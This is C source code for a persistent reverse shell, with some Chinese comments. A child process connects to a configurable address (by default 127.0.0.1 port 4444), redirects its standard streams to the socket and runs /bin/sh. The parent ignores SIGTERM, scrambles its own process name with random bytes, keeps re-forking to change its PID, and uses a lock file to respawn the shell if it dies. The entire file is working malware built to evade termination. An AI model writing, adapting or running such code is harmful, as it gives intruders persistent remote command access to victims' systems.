#include <stdio.h>
#include <pthread.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <string.h>
#include <setjmp.h>
#include <signal.h>

static jmp_buf env;
// static int rand_fd = 0;

#ifndef SOCKET_VAL
#define SOCKET_VAL 0x0100007f5c110002
#endif

// #define DEBUG 

// Ignore sigterm and sigpipe
void sigterm_handler(int sig) {
    return ;
}

void sigpipe_handler(int sig) {
    return ;
}

int lock_file(int fd, int cmd) {
    struct flock fl;
    fl.l_type = F_WRLCK;   // 写锁
    fl.l_whence = SEEK_SET;
    fl.l_start = 0;        // 文件开头
    fl.l_len = 0;          // 锁定整个文件

    return fcntl(fd, F_SETLK, &fl);
}

void unlock_file(int fd) {
    struct flock fl;
    fl.l_type = F_UNLCK;   // 解锁
    fl.l_whence = SEEK_SET;
    fl.l_start = 0;        // 文件开头
    fl.l_len = 0;          // 锁定整个文件
    
    #ifdef DEBUG
        if (fcntl(fd, F_SETLK, &fl) == -1) {
            perror("fcntl");
            exit(1);
        }
    #else
        fcntl(fd, F_SETLK, &fl);
    #endif
}   

void check_file_stat(int fd) {
    if (lock_file(fd, F_SETLK) == -1) {
        #ifdef DEBUG
            printf("[+] child process is running\n");
        #endif
        return;
    } else {
        #ifdef DEBUG
            printf("[+] child process is not running\n");
        #endif

        unlock_file(fd);
        close(fd);
        longjmp(env, 1);
    }
}

int main(int argc, char ** argv) {
    setjmp(env);

    signal(SIGPIPE, sigpipe_handler);
    signal(SIGTERM, sigterm_handler);
    
    int fd;
    #ifdef DEBUG
        if ((fd = open("/tmp/lock", O_CREAT | O_RDWR, 0666)) == -1) {
            perror("open");
            exit(1);
        }    
    #else 
        fd = open("/tmp/lock", O_CREAT | O_RDWR, 0666);
    #endif

    pid_t pid = fork();

    if (pid == 0) {
        #ifdef DEBUG
            printf("[-] Child process\n");
        #endif
        
        lock_file(fd, F_SETLKW);
        
        int sock = socket(AF_INET, SOCK_STREAM, 0);

        struct sockaddr addr;
        *(unsigned long long*)&addr = SOCKET_VAL;

        #ifdef DEBUG
            printf("[-] connect to %d", SOCKET_VAL);
        #endif

        connect(sock, &addr, 16);

        for (int i = 0; i < 3; i++) {
            dup2(sock, i);
        }
        execl("/bin/sh", "sh", (char *)NULL);

    } else {
        #ifdef DEBUG
            printf("[+] father process\n");
        #endif
        sleep(3);

        while (1) {
            char name[7] = {0};
            int rand_fd = open("/dev/random", O_RDONLY);

            read(rand_fd, argv[0], 6);
            prctl(PR_SET_NAME, name);

            check_file_stat(fd);
            pid_t pid = fork();       
            if (pid > 0) {
                sleep(5);
                exit(EXIT_SUCCESS);
            }
            sleep(1);
        }
    }

    return EXIT_SUCCESS;
}